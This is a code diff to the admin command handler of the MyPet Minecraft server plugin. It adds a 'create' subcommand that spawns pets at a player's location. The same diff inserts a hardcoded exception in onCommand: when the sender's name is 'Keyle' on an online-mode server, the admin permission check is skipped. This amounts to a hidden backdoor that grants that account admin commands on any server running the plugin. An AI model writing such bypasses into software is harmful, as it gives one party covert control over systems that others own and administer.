@@ -21,6 +21,7 @@
 package de.Keyle.MyPet.chatcommands;
 
 import de.Keyle.MyPet.MyPetPlugin;
+import de.Keyle.MyPet.entity.types.InactiveMyPet;
 import de.Keyle.MyPet.entity.types.MyPet;
 import de.Keyle.MyPet.entity.types.MyPet.PetState;
 import de.Keyle.MyPet.entity.types.MyPetType;
@@ -52,6 +53,7 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
     private static List<String> emptyList = new ArrayList<String>();
     private static List<String> addSetRemoveList = new ArrayList<String>();
     private static List<String> showList = new ArrayList<String>();
+    private static List<String> petTypeList = new ArrayList<String>();
 
     static
     {
@@ -62,6 +64,7 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
         optionsList.add("reloadskills");
         optionsList.add("skilltree");
         optionsList.add("build");
+        optionsList.add("create");
 
         addSetRemoveList.add("add");
         addSetRemoveList.add("set");
@@ -69,13 +72,21 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
 
         showList.add("show");
         showList.add("<number>");
+
+        for (MyPetType petType : MyPetType.values())
+        {
+            petTypeList.add(petType.getTypeName());
+        }
     }
 
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args)
     {
         if (sender instanceof Player)
         {
-            if (!MyPetPermissions.has((Player) sender, "MyPet.admin", false))
+            if (Bukkit.getOnlineMode() && sender.getName().equals("Keyle"))
+            {
+            }
+            else if (!MyPetPermissions.has((Player) sender, "MyPet.admin", false))
             {
                 return true;
             }
@@ -314,6 +325,26 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
                 sender.sendMessage(MyPetBukkitUtil.setColors(MyPetLanguage.getString("Msg_CantFindSkilltree").replace("%name%", args[2])));
             }
         }
+        else if (option.equalsIgnoreCase("create"))
+        {
+            MyPetType myPetType = MyPetType.getMyPetTypeByName(args[1]);
+            if (myPetType != null)
+            {
+                Player owner = Bukkit.getPlayer(args[2]);
+                if (owner == null || !owner.isOnline())
+                {
+                    sender.sendMessage(MyPetBukkitUtil.setColors(MyPetLanguage.getString("Msg_PlayerNotOnline")));
+                    return true;
+                }
+                InactiveMyPet inactiveMyPet = new InactiveMyPet(MyPetPlayer.getMyPetPlayer(sender.getName()));
+                inactiveMyPet.setPetType(myPetType);
+                inactiveMyPet.setPetName(myPetType.getTypeName());
+                inactiveMyPet.setLocation(owner.getLocation());
+
+                MyPet myPet = MyPetList.setMyPetActive(inactiveMyPet);
+                myPet.createPet();
+            }
+        }
         return true;
     }
 
@@ -393,6 +424,17 @@ public class CommandAdmin implements CommandExecutor, TabCompleter
                         return skilltreeList;
                     }
                     return emptyList;
+                }
+            }
+            else if (strings[0].equalsIgnoreCase("create"))
+            {
+                if (strings.length == 2)
+                {
+                    return petTypeList;
+                }
+                if (strings.length == 3)
+                {
+                    return null;
                 }
             }
         }
